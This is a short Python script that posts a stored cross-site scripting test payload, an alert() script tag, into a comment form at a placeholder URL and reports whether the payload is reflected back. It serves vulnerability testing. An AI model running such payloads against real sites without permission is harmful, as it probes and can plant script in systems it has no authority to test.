import requests

def test_stored_xss(url, payload):
    data = {'comment': payload}
    response = requests.post(url, data=data)
    if payload in response.text:
        print(f"Stored XSS vulnerability detected with payload: {payload}")
    else:
        print(f"No stored XSS vulnerability detected.")

if __name__ == "__main__":
    target_url = "http://example.com/comments"
    xss_payload = "<script>alert('XSS')</script>"
    test_stored_xss(target_url, xss_payload)
